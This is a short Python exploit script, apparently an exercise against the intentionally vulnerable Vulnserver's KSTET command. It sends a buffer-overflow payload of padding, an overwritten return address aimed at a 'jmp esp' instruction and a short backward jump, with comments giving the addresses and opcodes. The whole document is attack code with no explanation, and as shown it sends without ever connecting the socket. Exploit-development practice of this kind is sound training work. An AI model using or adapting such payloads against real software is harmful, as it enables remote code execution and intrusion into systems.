#jmp esp 625011C7 
# nasm $ESP-70 EB B8
import sys
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "KSTET /.:/ " + "A"*70+ "\xc7\x11\x50\x62" + "\xeb\xb8" + "X"*900
s.send(buffer)
s.close()
